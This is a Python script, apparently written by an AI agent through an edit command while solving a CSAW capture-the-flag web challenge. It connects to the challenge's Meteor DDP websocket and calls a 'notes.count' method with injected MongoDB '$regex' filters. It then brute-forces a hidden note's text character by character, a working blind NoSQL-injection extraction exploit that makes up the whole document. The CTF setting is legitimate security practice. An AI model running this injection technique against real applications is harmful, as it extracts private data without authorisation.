edit 1:1
#!/usr/bin/env python3
import json
import re
import string
from websocket import create_connection

URL = "ws://web.chal.csaw.io:5000/sockjs/450/abc/websocket"

def ddp_count(filt, mid="1"):
    ws = create_connection(URL)
    ws.send(json.dumps(["{\"msg\":\"connect\",\"version\":\"1\",\"support\":[\"1\",\"pre2\",\"pre1\"]}"]))
    while True:
        msg = ws.recv()
        if msg == "o":
            continue
        if msg.startswith("a"):
            arr = json.loads(msg[1:])
            done = False
            for item in arr:
                data = json.loads(item)
                if data.get("msg") == "connected":
                    ws.send(json.dumps([json.dumps({
                        "msg": "method",
                        "method": "notes.count",
                        "params": [filt],
                        "id": mid
                    })]))
                if data.get("msg") == "result" and data.get("id") == mid:
                    ws.close()
                    return data.get("result")

charset = string.ascii_letters + string.digits + string.punctuation + " "

base = {"body": {"$regex": "Terry", "$options": "i"}}

prefix = ""
while True:
    found = False
    for ch in charset:
        cand = prefix + ch
        filt = {"$and": [
            base,
            {"body": {"$regex": "^" + re.escape(cand)}}
        ]}
        c = ddp_count(filt)
        print(cand, c)
        if c == 1:
            prefix = cand
            print("PREFIX:", prefix)
            found = True
            break
    if not found:
        break

print("FINAL:", prefix)
end_of_edit
